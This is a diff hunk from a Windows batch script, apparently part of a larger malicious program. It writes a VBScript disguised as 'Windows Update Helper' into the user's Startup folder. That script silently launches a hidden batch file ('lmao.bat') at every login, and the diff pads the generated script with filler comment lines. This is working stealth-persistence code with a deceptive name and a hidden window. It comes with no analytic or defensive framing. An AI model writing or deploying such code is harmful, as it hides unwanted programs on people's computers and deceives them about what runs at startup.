@@ -304,10 +304,17 @@ goto :afterndtask
 
 REM END OF CRUCIAL CODE POSITION
 
+
 :createvbs
 echo creating vbs
 echo Set WshShell = CreateObject("WScript.Shell")  >"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 echo Set WshShell = Nothing >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 echo created successfully
 goto :aftervbs
+
